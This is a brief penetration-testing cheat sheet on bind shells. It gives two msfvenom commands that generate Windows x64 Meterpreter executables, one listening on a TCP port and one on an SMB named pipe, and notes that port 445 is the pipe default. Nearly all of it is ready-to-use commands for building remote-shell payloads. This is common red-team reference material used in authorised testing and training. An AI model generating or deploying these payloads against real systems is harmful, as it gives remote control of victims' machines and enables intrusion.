# Bind Shells

## 01 - x86-64 (64-bit) Payloads

```
$ msfvenom -p windows/x64/meterpreter_bind_tcp lport=<PORT> -f exe -o met-x86-64.exe
```

For the SMB pipe the default for LPORT will always be port **445**.

```
$ msfvenom -p windows/x64/meterpreter_bind_named_pipe lport=<PORT> pipename=<PIPENAME> -f exe -o met-x86-64.exe
```